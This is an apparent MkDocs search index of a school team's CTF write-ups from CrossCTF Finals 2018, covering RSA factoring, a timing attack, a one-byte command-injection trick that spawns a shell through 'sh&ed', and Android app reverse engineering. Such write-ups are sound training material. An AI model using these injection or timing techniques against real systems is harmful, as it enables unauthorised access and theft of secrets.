{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hey there! We're OSI Layer 8, a CTF Team from NUS High School. Here you'll find a collection of writeups for challenges our team solved.","title":"Home"},{"location":"#hey-there","text":"We're OSI Layer 8, a CTF Team from NUS High School. Here you'll find a collection of writeups for challenges our team solved.","title":"Hey there!"},{"location":"crossctf-finals2018/","text":"CrossCTF Finals 2018 \"That was some really intense score progression.\" - Ambrose Overview MkDocs sucks, but anyway see the sidebar on the left for the list of challenges","title":"Overview"},{"location":"crossctf-finals2018/#crossctf-finals-2018","text":"\"That was some really intense score progression.\" - Ambrose","title":"CrossCTF Finals 2018"},{"location":"crossctf-finals2018/#overview","text":"MkDocs sucks, but anyway see the sidebar on the left for the list of challenges","title":"Overview"},{"location":"crossctf-finals2018/crypto/babyrsa3/","text":"CrossCTF Finals 2018 : BabyRSA3 (crypto) So I heard that you can flip the private and public information for RSA... Creator - prokarius (@prokarius) We are given a file outNerfed.txt , which contains c , the ciphertext, d , the private exponent and phi(n) , which is equal to (p-1)(q-1) . Challenge To decrypt the ciphertext, we will need d and n . So the challenge here is to find a way to get n from phi(n) . Solution Factorization To get n from phi(n) , the most sensical step is to find p-1 and q-1 , so that we can find n=pq . We tried to use yafu to do it, and it worked very nicely. daniel@daniel \ue0b0 ~/Downloads/yafu \ue0b0 ./yafu 'factor(25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492)' fac: factoring 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C346 rho: x^2 + 2, starting 1000 iterations on C346 rho: x^2 + 1, starting 1000 iterations on C346 pm1: starting B1 = 150K, B2 = gmp-ecm default on C346 ecm: 0/30 curves on C334, B1=2K, B2=gmp-ecm default ecm: 0/29 curves on C322, B1=2K, B2=gmp-ecm default ecm: 0/28 curves on C310, B1=2K, B2=gmp-ecm default ecm: 0/27 curves on C272, B1=2K, B2=gmp-ecm default ecm: 0/26 curves on C259, B1=2K, B2=gmp-ecm default ecm: 1/25 curves on C246, B1=2K, B2=gmp-ecm default ecm: 0/23 curves on C221, B1=2K, B2=gmp-ecm default ecm: 1/22 curves on C196, B1=2K, B2=gmp-ecm default ecm: 1/20 curves on C183, B1=2K, B2=gmp-ecm default ecm: 0/18 curves on C170, B1=2K, B2=gmp-ecm default ecm: 2/17 curves on C157, B1=2K, B2=gmp-ecm default ecm: 3/14 curves on C144, B1=2K, B2=gmp-ecm default ecm: 1/10 curves on C132, B1=2K, B2=gmp-ecm default ecm: 8/8 curves on C119, B1=2K, B2=gmp-ecm default ecm: 3/74 curves on C119, B1=11K, B2=gmp-ecm default fac: factoring 48636585985082768736526784024200750021 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C38 rho: x^2 + 2, starting 1000 iterations on C38 rho: x^2 + 1, starting 1000 iterations on C38 pm1: starting B1 = 150K, B2 = gmp-ecm default on C38 ecm: 0/30 curves on C38, B1=2K, B2=gmp-ecm default ecm: 0/29 curves on C26, B1=2K, B2=gmp-ecm default Total factoring time = 0.1867 seconds fac: factoring 52537838568268884632273629 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C26 rho: x^2 + 2, starting 1000 iterations on C26 rho: x^2 + 1, starting 1000 iterations on C26 pm1: starting B1 = 150K, B2 = gmp-ecm default on C26 ecm: 1/30 curves on C26, B1=2K, B2=gmp-ecm default Total factoring time = 0.2959 seconds fac: factoring 9434943930960179869296047 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C25 rho: x^2 + 2, starting 1000 iterations on C25 rho: x^2 + 1, starting 1000 iterations on C25 pm1: starting B1 = 150K, B2 = gmp-ecm default on C25 ecm: 1/30 curves on C25, B1=2K, B2=gmp-ecm default Total factoring time = 0.2060 seconds Total factoring time = 4.6255 seconds ***factors found*** P1 = 2 P1 = 2 P13 = 2767687179787 P12 = 333600482773 P13 = 6938103821809 P13 = 3680247726403 P13 = 8313722160551 P13 = 6438418759151 P13 = 6545600536253 P13 = 6672422609813 P13 = 6579600728639 P13 = 3639128890921 P13 = 9566431650679 P13 = 9220079755217 P106 = 2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051 P13 = 4065711354007 P13 = 1973804930501 P13 = 6060693342503 P13 = 7265658595571 P13 = 7230980905199 P13 = 4754509728797 P13 = 1984419944251 ans = 1 Cleaning up the output, and putting them into a python script a = [] a.append(2) a.append(2) a.append(2767687179787) a.append(7230980905199) a.append(3680247726403) a.append(7265658595571) a.append(6545600536253) a.append(6579600728639) a.append(3639128890921) a.append(333600482773) a.append(9220079755217) a.append(8313722160551) a.append(9566431650679) a.append(6938103821809) a.append(6438418759151) a.append(2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051) a.append(4754509728797) a.append(6672422609813) a.append(1973804930501) a.append(6060693342503) a.append(1984419944251) a.append(4065711354007) c = 5499541793182458916572235549176816842668241174266452504513113060755436878677967801073969318886578771261808846567771826513941339489235903308596884669082743082338194484742630141310604711117885643229642732544775605225440292634865971099525895746978617397424574658645139588374017720075991171820873126258830306451326541384750806605195470098194462985494 d = 15664449102383123741256492823637853135125214807384742239549570131336662433268993001893338579081447660916548171028888182200587902832321164315176336792229529488626556438838274357507327295590873540152237706572328731885382033467068457038670389341764040515475556103158917133155868200492242619473451848383350924192696773958592530565397202086200003936447 phi = 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492 Find n Now, we just need to split the factors into 2 sets, satisfying the condition that the product of the integers in each set, added by 1, will be a prime number. In other words, split the factors we got into p-1 and q-1 , while making sure that p and q are both prime. To do so, we can use itertools.combinations to generate different combinations of factors, and check if they fit the conditions above. Once we managed to find the p and q we need, all we need is to do left is find m = c ^ d % n . import itertools import gmpy2 def P(a): return reduce(lambda x, y: x*y, a) for n in range(1, 12): for i in itertools.combinations(a, n): // check if p and q are prime if (gmpy2.is_prime(P(i) + 1)) and gmpy2.is_prime(phi / P(i) + 1): p = P(i) + 1 q = phi / P(i) + 1 // found n, decrypt the ciphertext n = p * q plain = gmpy2.powmod(c, d, n) print hex(plain)[2:].decode('hex') exit()","title":"BabyRSA"},{"location":"crossctf-finals2018/crypto/babyrsa3/#crossctf-finals-2018-babyrsa3-crypto","text":"So I heard that you can flip the private and public information for RSA... Creator - prokarius (@prokarius) We are given a file outNerfed.txt , which contains c , the ciphertext, d , the private exponent and phi(n) , which is equal to (p-1)(q-1) .","title":"CrossCTF Finals 2018 : BabyRSA3 (crypto)"},{"location":"crossctf-finals2018/crypto/babyrsa3/#challenge","text":"To decrypt the ciphertext, we will need d and n . So the challenge here is to find a way to get n from phi(n) .","title":"Challenge"},{"location":"crossctf-finals2018/crypto/babyrsa3/#solution","text":"","title":"Solution"},{"location":"crossctf-finals2018/crypto/babyrsa3/#factorization","text":"To get n from phi(n) , the most sensical step is to find p-1 and q-1 , so that we can find n=pq . We tried to use yafu to do it, and it worked very nicely. daniel@daniel \ue0b0 ~/Downloads/yafu \ue0b0 ./yafu 'factor(25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492)' fac: factoring 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C346 rho: x^2 + 2, starting 1000 iterations on C346 rho: x^2 + 1, starting 1000 iterations on C346 pm1: starting B1 = 150K, B2 = gmp-ecm default on C346 ecm: 0/30 curves on C334, B1=2K, B2=gmp-ecm default ecm: 0/29 curves on C322, B1=2K, B2=gmp-ecm default ecm: 0/28 curves on C310, B1=2K, B2=gmp-ecm default ecm: 0/27 curves on C272, B1=2K, B2=gmp-ecm default ecm: 0/26 curves on C259, B1=2K, B2=gmp-ecm default ecm: 1/25 curves on C246, B1=2K, B2=gmp-ecm default ecm: 0/23 curves on C221, B1=2K, B2=gmp-ecm default ecm: 1/22 curves on C196, B1=2K, B2=gmp-ecm default ecm: 1/20 curves on C183, B1=2K, B2=gmp-ecm default ecm: 0/18 curves on C170, B1=2K, B2=gmp-ecm default ecm: 2/17 curves on C157, B1=2K, B2=gmp-ecm default ecm: 3/14 curves on C144, B1=2K, B2=gmp-ecm default ecm: 1/10 curves on C132, B1=2K, B2=gmp-ecm default ecm: 8/8 curves on C119, B1=2K, B2=gmp-ecm default ecm: 3/74 curves on C119, B1=11K, B2=gmp-ecm default fac: factoring 48636585985082768736526784024200750021 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C38 rho: x^2 + 2, starting 1000 iterations on C38 rho: x^2 + 1, starting 1000 iterations on C38 pm1: starting B1 = 150K, B2 = gmp-ecm default on C38 ecm: 0/30 curves on C38, B1=2K, B2=gmp-ecm default ecm: 0/29 curves on C26, B1=2K, B2=gmp-ecm default Total factoring time = 0.1867 seconds fac: factoring 52537838568268884632273629 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C26 rho: x^2 + 2, starting 1000 iterations on C26 rho: x^2 + 1, starting 1000 iterations on C26 pm1: starting B1 = 150K, B2 = gmp-ecm default on C26 ecm: 1/30 curves on C26, B1=2K, B2=gmp-ecm default Total factoring time = 0.2959 seconds fac: factoring 9434943930960179869296047 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C25 rho: x^2 + 2, starting 1000 iterations on C25 rho: x^2 + 1, starting 1000 iterations on C25 pm1: starting B1 = 150K, B2 = gmp-ecm default on C25 ecm: 1/30 curves on C25, B1=2K, B2=gmp-ecm default Total factoring time = 0.2060 seconds Total factoring time = 4.6255 seconds ***factors found*** P1 = 2 P1 = 2 P13 = 2767687179787 P12 = 333600482773 P13 = 6938103821809 P13 = 3680247726403 P13 = 8313722160551 P13 = 6438418759151 P13 = 6545600536253 P13 = 6672422609813 P13 = 6579600728639 P13 = 3639128890921 P13 = 9566431650679 P13 = 9220079755217 P106 = 2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051 P13 = 4065711354007 P13 = 1973804930501 P13 = 6060693342503 P13 = 7265658595571 P13 = 7230980905199 P13 = 4754509728797 P13 = 1984419944251 ans = 1 Cleaning up the output, and putting them into a python script a = [] a.append(2) a.append(2) a.append(2767687179787) a.append(7230980905199) a.append(3680247726403) a.append(7265658595571) a.append(6545600536253) a.append(6579600728639) a.append(3639128890921) a.append(333600482773) a.append(9220079755217) a.append(8313722160551) a.append(9566431650679) a.append(6938103821809) a.append(6438418759151) a.append(2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051) a.append(4754509728797) a.append(6672422609813) a.append(1973804930501) a.append(6060693342503) a.append(1984419944251) a.append(4065711354007) c = 5499541793182458916572235549176816842668241174266452504513113060755436878677967801073969318886578771261808846567771826513941339489235903308596884669082743082338194484742630141310604711117885643229642732544775605225440292634865971099525895746978617397424574658645139588374017720075991171820873126258830306451326541384750806605195470098194462985494 d = 15664449102383123741256492823637853135125214807384742239549570131336662433268993001893338579081447660916548171028888182200587902832321164315176336792229529488626556438838274357507327295590873540152237706572328731885382033467068457038670389341764040515475556103158917133155868200492242619473451848383350924192696773958592530565397202086200003936447 phi = 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492","title":"Factorization"},{"location":"crossctf-finals2018/crypto/babyrsa3/#find-n","text":"Now, we just need to split the factors into 2 sets, satisfying the condition that the product of the integers in each set, added by 1, will be a prime number. In other words, split the factors we got into p-1 and q-1 , while making sure that p and q are both prime. To do so, we can use itertools.combinations to generate different combinations of factors, and check if they fit the conditions above. Once we managed to find the p and q we need, all we need is to do left is find m = c ^ d % n . import itertools import gmpy2 def P(a): return reduce(lambda x, y: x*y, a) for n in range(1, 12): for i in itertools.combinations(a, n): // check if p and q are prime if (gmpy2.is_prime(P(i) + 1)) and gmpy2.is_prime(phi / P(i) + 1): p = P(i) + 1 q = phi / P(i) + 1 // found n, decrypt the ciphertext n = p * q plain = gmpy2.powmod(c, d, n) print hex(plain)[2:].decode('hex') exit()","title":"Find n"},{"location":"crossctf-finals2018/crypto/fitblips/","text":"CrossCTF Finals 2018 : fitblips (crypto) How many steps does your Fitblip beep? nc ctf.pwn.sg 4003 Creator - amon (@nn_amon) server code Analysis To summarize what this program does: It reads the flag from a file, hex encodes it, and turns it into a stream of bits Reads in user input, hex encodes it, and turns it into a stream of bits Compares the user input and flag bit by bit, and terminates once it is different Prints the time taken for comparison, plus the number of bits that matched. Oops forgot to mention, it also lets the user decide how many times to run the same comparison. On first sight, we can tell that this is simply just a programming challenge to do a timing attack. Except that since everyone in the competition is hitting the server it is more accurate to use the score than to use the time taken. Solution Simply write a script to try strings that start exactly the same but one ending with bit 0 and one ending with bit 1. You can find our script here . Because why not","title":"Fitblips"},{"location":"crossctf-finals2018/crypto/fitblips/#crossctf-finals-2018-fitblips-crypto","text":"How many steps does your Fitblip beep? nc ctf.pwn.sg 4003 Creator - amon (@nn_amon) server code","title":"CrossCTF Finals 2018 : fitblips (crypto)"},{"location":"crossctf-finals2018/crypto/fitblips/#analysis","text":"To summarize what this program does: It reads the flag from a file, hex encodes it, and turns it into a stream of bits Reads in user input, hex encodes it, and turns it into a stream of bits Compares the user input and flag bit by bit, and terminates once it is different Prints the time taken for comparison, plus the number of bits that matched. Oops forgot to mention, it also lets the user decide how many times to run the same comparison. On first sight, we can tell that this is simply just a programming challenge to do a timing attack. Except that since everyone in the competition is hitting the server it is more accurate to use the score than to use the time taken.","title":"Analysis"},{"location":"crossctf-finals2018/crypto/fitblips/#solution","text":"Simply write a script to try strings that start exactly the same but one ending with bit 0 and one ending with bit 1. You can find our script here .","title":"Solution"},{"location":"crossctf-finals2018/crypto/fitblips/#because-why-not","text":"","title":"Because why not"},{"location":"crossctf-finals2018/misc/evil/","text":"CrossCTF Finals 2018 : The Evilness (Misc) First Blood by : OSI Layer 8 Ready for something ridiculously difficult? nc ctf.pwn.sg 4020 Challenge Once we connect to the address, we get: #!/usr/bin/env python import sys import flag import signal import os import tempfile temp_file = tempfile.NamedTemporaryFile(prefix=\"cartoon-\", suffix=\".dat\", delete=True) def handler(signum, frame): write(\"Times up!\") temp_file.close() sys.exit(0) def write(data, endl='\\n'): sys.stdout.write(data + endl) sys.stdout.flush() def readline(): return sys.stdin.readline().strip() def main(): abspath = os.path.abspath(__file__) dname = os.path.dirname(abspath) os.chdir(dname) signal.signal(signal.SIGALRM, handler) signal.alarm(10) # Write the flag to the temp file temp_file.file.write(flag.flag) temp_file.file.flush() # Oh I'm sorry, did you want this? del flag.flag write(open(__file__).read()) command = \"/usr/bin/shred \" + temp_file.name write(\"Here comes the shredder! (%s)\" % command) ###################################################################### # # INCOMING TRANSMISSION... # # CAREFUL AGENT. WE DO NOT HAVE MUCH TIME. I'VE OPENED A WORMHOLE IN # THE FABRIC OF TIME AND SPACE TO INTRODUCE A FAULT IN ONE BYTE! # # MAKE USE OF IT WISELY! # command_fault = list(command) index = int(readline()) byt = int(readline(), 16) if (0x0 <= index < len(command_fault)): if (0x0 <= byt <= 0xff): command_fault[index] = chr(byt) command = \"\".join(command_fault) # # TRANSMISSION ENDED # ###################################################################### # Oooh, did you want this too? Too bad it's being... shredded. os.system(command) if __name__ == \"__main__\": main() Here comes the shredder! (/usr/bin/shred /tmp/cartoon-EcqWge.dat) Basically, we get to change one character in command /usr/bin/shred /tmp/cartoon-XXXXX.dat to any character we want, and the flag is stored in /tmp/cartoon-XXXXX.dat Solution There is a less known editor called ed on Linux systems. We can type in !sh inside the editor to drop into the shell. We can replace the letter 'h' with '&' in the command to instead run: /usr/bin/sh&ed /tmp/cartoon-XXXXX.dat which will run /usr/bin/sh (which doesn't exist), and then run ed /tmp/cartoon-XXXXX.dat . To replace the character, we send a index of 11, and I was too lazy to Ask the Oracle on how to actually use ed , so I just went to shell and ran cat flag The solution script is here","title":"The Evilness"},{"location":"crossctf-finals2018/misc/evil/#crossctf-finals-2018-the-evilness-misc","text":"","title":"CrossCTF Finals 2018 : The Evilness (Misc)"},{"location":"crossctf-finals2018/misc/evil/#first-blood-by-osi-layer-8","text":"Ready for something ridiculously difficult? nc ctf.pwn.sg 4020","title":"First Blood by : OSI Layer 8"},{"location":"crossctf-finals2018/misc/evil/#challenge","text":"Once we connect to the address, we get: #!/usr/bin/env python import sys import flag import signal import os import tempfile temp_file = tempfile.NamedTemporaryFile(prefix=\"cartoon-\", suffix=\".dat\", delete=True) def handler(signum, frame): write(\"Times up!\") temp_file.close() sys.exit(0) def write(data, endl='\\n'): sys.stdout.write(data + endl) sys.stdout.flush() def readline(): return sys.stdin.readline().strip() def main(): abspath = os.path.abspath(__file__) dname = os.path.dirname(abspath) os.chdir(dname) signal.signal(signal.SIGALRM, handler) signal.alarm(10) # Write the flag to the temp file temp_file.file.write(flag.flag) temp_file.file.flush() # Oh I'm sorry, did you want this? del flag.flag write(open(__file__).read()) command = \"/usr/bin/shred \" + temp_file.name write(\"Here comes the shredder! (%s)\" % command) ###################################################################### # # INCOMING TRANSMISSION... # # CAREFUL AGENT. WE DO NOT HAVE MUCH TIME. I'VE OPENED A WORMHOLE IN # THE FABRIC OF TIME AND SPACE TO INTRODUCE A FAULT IN ONE BYTE! # # MAKE USE OF IT WISELY! # command_fault = list(command) index = int(readline()) byt = int(readline(), 16) if (0x0 <= index < len(command_fault)): if (0x0 <= byt <= 0xff): command_fault[index] = chr(byt) command = \"\".join(command_fault) # # TRANSMISSION ENDED # ###################################################################### # Oooh, did you want this too? Too bad it's being... shredded. os.system(command) if __name__ == \"__main__\": main() Here comes the shredder! (/usr/bin/shred /tmp/cartoon-EcqWge.dat) Basically, we get to change one character in command /usr/bin/shred /tmp/cartoon-XXXXX.dat to any character we want, and the flag is stored in /tmp/cartoon-XXXXX.dat","title":"Challenge"},{"location":"crossctf-finals2018/misc/evil/#solution","text":"There is a less known editor called ed on Linux systems. We can type in !sh inside the editor to drop into the shell. We can replace the letter 'h' with '&' in the command to instead run: /usr/bin/sh&ed /tmp/cartoon-XXXXX.dat which will run /usr/bin/sh (which doesn't exist), and then run ed /tmp/cartoon-XXXXX.dat . To replace the character, we send a index of 11, and I was too lazy to Ask the Oracle on how to actually use ed , so I just went to shell and ran cat flag The solution script is here","title":"Solution"},{"location":"crossctf-finals2018/mobile/human/","text":"CrossCTF Finals 2018 : Human Powered Flag Generator First Blood by : Segfaulters Keep cranking until the whole flag appears! Creator - prokarius (@prokarius) Static Analysis We are given an APK file, which upon extracting and converting to its Java code, we get: package com.a2018.crossctf.humanpoweredflaggenerator; import android.content.res.Resources; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.view.View; import android.widget.TextView; public class MainActivity extends AppCompatActivity { private TextView flagDisplay; private TextView percent; private Status status; protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView((int) C0185R.layout.activity_main); this.status = new Status(); this.flagDisplay = (TextView) findViewById(C0185R.id.flagTextView); this.percent = (TextView) findViewById(C0185R.id.percentTextView); findViewById(C0185R.id.speedupButton).setOnClickListener(new MainActivity$$Lambda$0(this)); findViewById(C0185R.id.crankButton).setOnClickListener(new MainActivity$$Lambda$1(this)); } final /* synthetic */ void lambda$onCreate$0$MainActivity(View view) { this.status.speedUp(); } final /* synthetic */ void lambda$onCreate$1$MainActivity(View view) { crank(); } private void crank() { this.status.crank(3.8d); Resources res = getResources(); this.flagDisplay.setText(res.getString(C0185R.string.flag, new Object[]{this.status.flag()})); this.percent.setText(res.getString(C0185R.string.percent, new Object[]{Integer.valueOf(this.status.level()), this.status.percent()})); } } Seems like the app has a display for the flag, a display for percent of work done, and a button to 'work' to flag generation, and a button to speed up the process. package com.a2018.crossctf.humanpoweredflaggenerator; import android.annotation.SuppressLint; import java.math.BigInteger; class Status { private BigInteger curr; private BigInteger f9f; private StringBuilder flagBuilder = new StringBuilder(); private BigInteger fmax; private int level = 0; private BigInteger max; private BigInteger prod; Status() { upLevel(); } public void crank(double am) { double amount = Math.pow(am, (double) this.level); for (int i = 0; ((double) i) < amount; i++) { if (this.max.compareTo(this.curr) == 0) { if (this.level != 13) { this.flagBuilder.append(extract()); upLevel(); } else { return; } } else if (this.f9f.compareTo(this.fmax) == 0) { this.curr = this.curr.add(BigInteger.ONE); upF(); } else { this.prod = this.prod.multiply(this.f9f); this.f9f = this.f9f.add(BigInteger.ONE); } } } public String flag() { return this.flagBuilder.toString(); } public int level() { return this.level; } @SuppressLint({\"DefaultLocale\"}) public String percent() { double frac = BigInteger.valueOf(10000).divide(this.max.subtract(BigInteger.ONE)).doubleValue(); double x = this.curr.doubleValue() - 1.0d; return String.format(\"%.2f\", new Object[]{Double.valueOf(Math.min(100.0d, (((BigInteger.valueOf(10000).multiply(this.f9f).divide(this.fmax).doubleValue() / 10000.0d) + x) * frac) / 100.0d))}); } private void upLevel() { this.level++; this.max = BigInteger.ONE.shiftLeft(this.level).add(BigInteger.ONE); this.curr = BigInteger.ONE; this.prod = BigInteger.ONE; upF(); } private void upF() { this.fmax = fastExpo(BigInteger.valueOf(5), this.curr).add(BigInteger.ONE); this.f9f = BigInteger.ONE; } public void speedUp() { while (this.prod.mod(BigInteger.TEN).equals(BigInteger.ZERO)) { this.prod = this.prod.divide(BigInteger.TEN); } } private String extract() { BigInteger thousand = BigInteger.valueOf(1000); speedUp(); return this.prod.mod(thousand).add(thousand).toString().substring(1); } private static BigInteger fastExpo(BigInteger x, BigInteger y) { BigInteger out = BigInteger.ONE; while (y.compareTo(BigInteger.ONE) != 0) { if (y.and(BigInteger.ONE).equals(BigInteger.ONE)) { out = out.multiply(x); } x = x.multiply(x); y = y.shiftRight(1); } return out.multiply(x); } } (other useless files like lambda classes/resources files filtered out) This seems like the meat of the app. Extracting this class out and running it on my local machine using a Java IDE, it seems that it takes a ... very long time ... yea no, running it won't solve the problem. The flagBuilder is a StringBuilder containing the flag. I started out by combining the methods together so to form as few methods as possible, then I converted this to Python so that my eyes don't bleed from the verbosity of Java. class Status: __init__(): level=1 max = 3 curr = 1 prod =1 fmax = 6 f9f = 1 flag = '' def crank(am): amount = am**level; for i in range(amount): if max == curr if level == 13: return while prod%10==0: prod//=10 flag += str((prod%1000)+1000)[1:] level++ max = 1<<level +1 curr = 1 prod = 1 fmax = 6 f9f = 1 elif f9f == fmax: curr++; fmax = (5**curr) + 1 f9f = 1 else: prod *= f9f; f9f++; The entire class can be replaced by just the crank method, as long as the state is stored within the function itself. We will do that, and things should get a lot simpler. The crank() code still looks really bad, so we can begin by simplifying the code. The code looks suspiciously like disassembled nested while loops, so I started with that concept, then made crank() return the flag instead of just shoving into a variable. def crank(): flag = '' for level in range(1,13): prod=1 for curr in range(1, (1<<level)+1): fmax = 5**curr+1 for f9f in range(fmax) prod *= f9f while prod % 10 == 0: prod = prod // 10 flag+= str(prod%1000).rjust(3,'0') return flag The innermost for loop can be simplified, so the code can be: def crank(): flag = '' for level in range(1,13): prod=1 for curr in range(1, (1<<level)+1): prod *= factorial(curr) while prod % 10 == 0: prod = prod // 10 flag+= str(prod%1000).rjust(3,'0') return flag where factorial is the factorial function, which I created to be a simple for-loop instead of recursion (python and its stack ;-;). That's not the real problem of course. It took wayyyy to long. Of course, it's because we are going to call factorial(5**(1<<level)), which will take toooooo long. I was going to use Wolfram Alpha's API to get the factorial of those large numbers, when I realised there was a pattern in the factorials of (5* i): the last 3 digits are repeating (984, 088, 016, 912), except for factorial(5* 1) which is 120. Since the flag only cares about the last 3 digits of prod, which is the multiplication of all factorials of (5**i) in the range [1 to 1<<level], we can replace the factorial function with one that gives only the last 3 digits: def factorial(g): if g == 1: return 120 else: return [984, 88, 16, 912][(g-2)%4] The final code is in here","title":"Human Powered Flag Generator"},{"location":"crossctf-finals2018/mobile/human/#crossctf-finals-2018-human-powered-flag-generator","text":"","title":"CrossCTF Finals 2018 : Human Powered Flag Generator"},{"location":"crossctf-finals2018/mobile/human/#first-blood-by-segfaulters","text":"Keep cranking until the whole flag appears! Creator - prokarius (@prokarius)","title":"First Blood by : Segfaulters"},{"location":"crossctf-finals2018/mobile/human/#static-analysis","text":"We are given an APK file, which upon extracting and converting to its Java code, we get: package com.a2018.crossctf.humanpoweredflaggenerator; import android.content.res.Resources; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.view.View; import android.widget.TextView; public class MainActivity extends AppCompatActivity { private TextView flagDisplay; private TextView percent; private Status status; protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView((int) C0185R.layout.activity_main); this.status = new Status(); this.flagDisplay = (TextView) findViewById(C0185R.id.flagTextView); this.percent = (TextView) findViewById(C0185R.id.percentTextView); findViewById(C0185R.id.speedupButton).setOnClickListener(new MainActivity$$Lambda$0(this)); findViewById(C0185R.id.crankButton).setOnClickListener(new MainActivity$$Lambda$1(this)); } final /* synthetic */ void lambda$onCreate$0$MainActivity(View view) { this.status.speedUp(); } final /* synthetic */ void lambda$onCreate$1$MainActivity(View view) { crank(); } private void crank() { this.status.crank(3.8d); Resources res = getResources(); this.flagDisplay.setText(res.getString(C0185R.string.flag, new Object[]{this.status.flag()})); this.percent.setText(res.getString(C0185R.string.percent, new Object[]{Integer.valueOf(this.status.level()), this.status.percent()})); } } Seems like the app has a display for the flag, a display for percent of work done, and a button to 'work' to flag generation, and a button to speed up the process. package com.a2018.crossctf.humanpoweredflaggenerator; import android.annotation.SuppressLint; import java.math.BigInteger; class Status { private BigInteger curr; private BigInteger f9f; private StringBuilder flagBuilder = new StringBuilder(); private BigInteger fmax; private int level = 0; private BigInteger max; private BigInteger prod; Status() { upLevel(); } public void crank(double am) { double amount = Math.pow(am, (double) this.level); for (int i = 0; ((double) i) < amount; i++) { if (this.max.compareTo(this.curr) == 0) { if (this.level != 13) { this.flagBuilder.append(extract()); upLevel(); } else { return; } } else if (this.f9f.compareTo(this.fmax) == 0) { this.curr = this.curr.add(BigInteger.ONE); upF(); } else { this.prod = this.prod.multiply(this.f9f); this.f9f = this.f9f.add(BigInteger.ONE); } } } public String flag() { return this.flagBuilder.toString(); } public int level() { return this.level; } @SuppressLint({\"DefaultLocale\"}) public String percent() { double frac = BigInteger.valueOf(10000).divide(this.max.subtract(BigInteger.ONE)).doubleValue(); double x = this.curr.doubleValue() - 1.0d; return String.format(\"%.2f\", new Object[]{Double.valueOf(Math.min(100.0d, (((BigInteger.valueOf(10000).multiply(this.f9f).divide(this.fmax).doubleValue() / 10000.0d) + x) * frac) / 100.0d))}); } private void upLevel() { this.level++; this.max = BigInteger.ONE.shiftLeft(this.level).add(BigInteger.ONE); this.curr = BigInteger.ONE; this.prod = BigInteger.ONE; upF(); } private void upF() { this.fmax = fastExpo(BigInteger.valueOf(5), this.curr).add(BigInteger.ONE); this.f9f = BigInteger.ONE; } public void speedUp() { while (this.prod.mod(BigInteger.TEN).equals(BigInteger.ZERO)) { this.prod = this.prod.divide(BigInteger.TEN); } } private String extract() { BigInteger thousand = BigInteger.valueOf(1000); speedUp(); return this.prod.mod(thousand).add(thousand).toString().substring(1); } private static BigInteger fastExpo(BigInteger x, BigInteger y) { BigInteger out = BigInteger.ONE; while (y.compareTo(BigInteger.ONE) != 0) { if (y.and(BigInteger.ONE).equals(BigInteger.ONE)) { out = out.multiply(x); } x = x.multiply(x); y = y.shiftRight(1); } return out.multiply(x); } } (other useless files like lambda classes/resources files filtered out) This seems like the meat of the app. Extracting this class out and running it on my local machine using a Java IDE, it seems that it takes a ... very long time ... yea no, running it won't solve the problem. The flagBuilder is a StringBuilder containing the flag. I started out by combining the methods together so to form as few methods as possible, then I converted this to Python so that my eyes don't bleed from the verbosity of Java. class Status: __init__(): level=1 max = 3 curr = 1 prod =1 fmax = 6 f9f = 1 flag = '' def crank(am): amount = am**level; for i in range(amount): if max == curr if level == 13: return while prod%10==0: prod//=10 flag += str((prod%1000)+1000)[1:] level++ max = 1<<level +1 curr = 1 prod = 1 fmax = 6 f9f = 1 elif f9f == fmax: curr++; fmax = (5**curr) + 1 f9f = 1 else: prod *= f9f; f9f++; The entire class can be replaced by just the crank method, 